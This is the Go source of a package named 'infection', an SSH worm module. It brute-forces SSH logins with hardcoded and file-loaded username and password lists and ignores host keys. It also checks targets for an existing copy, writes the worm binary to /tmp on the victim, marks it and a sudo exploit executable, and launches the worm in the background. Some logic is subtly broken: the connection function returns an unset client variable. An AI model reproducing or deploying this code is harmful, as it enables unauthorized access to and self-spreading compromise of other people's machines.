package infection

import (
	"golang.org/x/crypto/ssh"
	//"log"
	"time"
	"bytes"
	"os"
	"bufio"
	//"fmt"
)

var (
	username = "kali"
	password = "kali"
	worm_dir = "/tmp"
	sudo_exploit_filename = "exploit_nss_manual"
	worm_filename = "worm"
	timeout = time.Minute
	users_const = [...]string {"enric", "guillem", "ubuntu", "manel", "lluis", "marti"}
	pwds_const = [...]string {"arturitoRules", "GuillemXetoPass", "ubuntu", "PeatgeAp7", "JakeNineNine", "Martisu4presi"}
)

func GuessSSHConnectionFromFile (ip string) bool {
	var client *ssh.Client
	var session *ssh.Session

	timeout = time.Minute
	users,err_users := os.Open("users.txt")
	if err_users != nil {
		//log.Fatal(err_users)
	}
	defer users.Close()
	user_scanner := bufio.NewScanner(users)
	for user_scanner.Scan() {
		if (client == nil && session == nil) {
			username = user_scanner.Text()
			pwds,err_pwds := os.Open("passwords.txt")
	  		if err_pwds != nil {
	    		//log.Fatal(err_pwds)
	  		}
			defer pwds.Close()
			pwd_scanner := bufio.NewScanner(pwds)
			for pwd_scanner.Scan(){
				if (client == nil && session == nil) {
					password = pwd_scanner.Text()
					client, session = OpenSSHConnection(ip)
				}
    			}

			if err_pwds := pwd_scanner.Err(); err_pwds != nil {
				//log.Fatal(err_pwds)
			}
		}
	}

	if err_users := user_scanner.Err(); err_users != nil {
		//log.Fatal(err_users)
	}

	if (session != nil){
		return true
	} else {
		return false
	}
}

func GuessSSHConnectionV2 (ip string) bool {
	var client *ssh.Client
	var session *ssh.Session

	timeout = time.Minute

	for i := 0; i < len(users_const); i++ {
		if (client == nil && session == nil) {
			username = users_const[i]
			for j := 0; j < len(pwds_const); j++ {
				if (client == nil && session == nil) {
					password = pwds_const[j]
					client, session = OpenSSHConnection(ip)
				}
			}
		}
	}

	if (session != nil){
		return true
	} else {
		return false
	}
}

func OpenSSHConnection(ip string) (*ssh.Client, *ssh.Session) {
	var c *ssh.Client
	var s *ssh.Session
	var err error

	var miss bool

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: timeout,
	}
	miss = false

	//log.Println("Connecting with pair:", "username:", username, "password:", password, "on ip:", ip)
	client, err := ssh.Dial("tcp",ip,config)
	if err != nil {
		//log.Println("Failed to dial: ", err)
		miss = true
	}
	if !miss {
	  s, err = client.NewSession()
	  if err != nil {
	  	//log.Println("Failed to create session: ", err)
	  }
  }
	return c,s
}

func SshCheckInfection(ip string) bool {
	client, session := OpenSSHConnection(ip)
	if client != nil {
		defer client.Close()
	}
	defer session.Close()

	out, _ := session.CombinedOutput("if [ -f \"" + worm_dir + "/" + worm_filename + "\" ]; then echo \"hola\"; fi;")
	//log.Printf("Command output: %q", out)
	if len(out) != 0 {
		//log.Printf("Command output: %q", out)
		return true
	}

	return false
}

func SshInfect(ip string, filename string) string {
	client, session := OpenSSHConnection(ip)
	if client != nil {
		defer client.Close()
	}
	defer session.Close()

	var worm []byte
	worm = GetFile(worm_dir + "/" + filename)
	session.Stdin = bytes.NewReader(worm)
	session.CombinedOutput("cat > " + worm_dir + "/" + filename)

	return "Finished infecting"
}


func SshExploit(ip string) string {
	client, session := OpenSSHConnection(ip)
	if client != nil {
		defer client.Close()
	}
	defer session.Close()

	session.CombinedOutput(
		"chmod u+x " + worm_dir + "/worm && " +
		"chmod u+x " + worm_dir + "/" + sudo_exploit_filename + " && " +
		"nohup " + worm_dir + "/worm &")

	return "Finished exploiting"
}
